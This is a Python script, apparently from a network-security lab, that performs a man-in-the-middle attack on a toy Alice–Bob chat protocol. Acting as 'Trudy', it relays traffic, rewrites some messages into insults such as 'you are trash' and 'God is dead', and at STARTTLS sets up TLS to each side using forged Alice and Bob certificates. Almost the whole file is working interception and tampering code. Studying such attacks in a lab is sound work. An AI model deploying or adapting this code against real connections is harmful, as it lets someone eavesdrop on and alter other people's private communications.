
import ssl
import socket as sc

CHAT_HELLO = 'CHAT_HELLO'
CHAT_REPLY = 'CHAT_REPLY'
CHAT_STARTTLS = 'CHAT_STARTTLS'
CHAT_STARTTLS_ACK = 'CHAT_STARTTLS_ACK'
CHAT_STARTTLS_NOT_SUPPORTED = 'CHAT_STARTTLS_NOT_SUPPORTED'
CHAT_CLOSE = 'CHAT_CLOSE'


class M_I_T_M:
    def __init__(self,clientname,servername):

        a=sc.AF_INET
        b=sc.SOCK_STREAM
        self.pseudo_recvsock = sc.socket(a, b)
        port = int(input('Enter the port '))
        self.pseudo_recvsock.bind(('', port))
        self.pseudo_recvsock.listen(1)
        print('Waiting For Client.......')

        # connection to be established between fake Bob and Alice
        self.sendsock, send_addr = self.pseudo_recvsock.accept()
        print(f"Connection fetched from {send_addr}")

        # Creating a pseudo socket for Alice
        self.pseudo_sendsock = sc.socket(a, b)

        # fetch the IP adress from the domain name using gethostbyname for Fake Bob
        try:
            server_ip = sc.gethostbyname(servername)
            self.pseudo_sendsock.connect((server_ip, port))  # connection established between Bob and fake alice
            print(f"Connection establsihed with {server_ip}")
        except sc.gaierror:
            print("Error resolving the host")
            exit()

        self.clientname = clientname
        self.servername = servername


        self.progress_conn()
        self.close_connection()

    def progress_conn(self):
        tls_count= False
        while (True):
            # recieving from Alice & sending to Bob
            data = self.sendsock.recv(1024)
            decoded_data=data.decode()
            print(f"The message recieved from {self.clientname} was {decoded_data} ")
            if decoded_data == "Hi":
                self.pseudo_sendsock.sendall("Bye".encode())
                print(f"Sent Bye to {self.servername}")
            elif decoded_data == "How are you?":
                print(f"Sent you are trash to {self.servername}")
                self.pseudo_sendsock.sendall("you are trash".encode())
            elif decoded_data == "God bless you":
                print(f"Sent God is dead to {self.servername}")
                self.pseudo_sendsock.sendall("God is dead".encode())
            else:
                print(f"Sent {data.decode()} to {self.servername}")
                self.pseudo_sendsock.sendall(data)
            if (decoded_data == CHAT_CLOSE):
                print(f"{decoded_data} was recieved from Alice...sending the same to Bob and quiting!")
                break

            # reciving from bob & sending to Alice
            data = self.pseudo_sendsock.recv(1024)
            decoded_data=data.decode()
            print(f"{decoded_data} was recieved from {self.servername}")
            print(f"Sent {decoded_data} to {self.clientname}")
            self.sendsock.sendall(data)

            decoded_data=data.decode()
            if decoded_data == CHAT_STARTTLS_ACK :
                if tls_count == False:
                # Loading Keys and Certificates of Fake Alice
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    context.load_verify_locations('root.crt')
                    context.load_cert_chain('FakeAlice/fake_alice.crt', 'FakeAlice/alice_fake_pvtkey.pem')
                    context.verify_mode = ssl.CERT_REQUIRED
                    self.pseudo_sendsock = context.wrap_socket(self.pseudo_sendsock, server_hostname=self.servername, do_handshake_on_connect=True)
                    print('SSL Certificates Verified Succesfully\nSecure TLS 1.3 pipe is Established between Bob & Trudy')

                    # Loading Keys and Certificates of fake BOB
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    context.load_verify_locations('root.crt')
                    context.load_cert_chain('FakeBob/fake_bob.crt', 'FakeBob/fake_bob_pvtkey.pem')
                    context.verify_mode = ssl.CERT_REQUIRED
                    self.sendsock = context.wrap_socket(
                        self.sendsock, server_side=True, do_handshake_on_connect=True)
                    print('Secure TLS 1.3 pipe Established between Trudy & Alice')
                    tls_count = True
                    print("M I T M attack is Succesfull\nYou are now Succesfully in between Alice1 & Bob1")

            elif (decoded_data == CHAT_CLOSE):
                print(f"The message recieved from Bob was {decoded_data}......Sending the same to Alice and quiting!")
                break

    def close_connection(self):
        # closing the connections
        self.sendsock.close()
        self.pseudo_sendsock.close()
        self.pseudo_recvsock.close()

